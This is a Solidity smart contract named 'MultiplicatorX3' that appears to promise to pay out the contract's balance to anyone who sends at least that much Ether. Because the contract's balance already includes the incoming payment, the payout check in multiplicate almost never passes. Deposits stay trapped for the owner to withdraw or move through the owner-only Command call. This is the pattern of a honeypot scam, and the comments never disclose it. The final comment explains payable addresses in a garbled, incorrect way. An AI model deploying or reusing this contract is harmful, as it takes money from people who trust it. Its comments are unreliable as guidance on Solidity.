pragma solidity ^0.4.18;

contract MultiplicatorX3
{
    address public Owner = msg.sender; /* This line of code is executed when the contract is deployed, 
                                        and it sets the "Owner" address to the address of the deployer of the contract,
                                        and it will always be set to that address*/
    function() public payable{}
   
    function withdraw() payable public {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);   /* transfer all the balance from the contract to the "Owner" address
                                        (in this case, it is address of contract deployer, not of the person
                                        who called the function). */
    }
    
    function Command(address adr, bytes data) payable public {
        require(msg.sender == Owner);
        adr.call.value(msg.value)(data);
    }
    
    function multiplicate(address adr) public payable {
        if (msg.value >= this.balance) {        
            adr.transfer(this.balance + msg.value);
        }
    }
}
/* Even though the "Owner" address is not declared as "payable", 
it can still receive Ether because it is calling the "transfer" method on itself.
"address" is not "payable" by default. However, an address can still receive Ether 
because an address can call a contract function with the "transfer" method */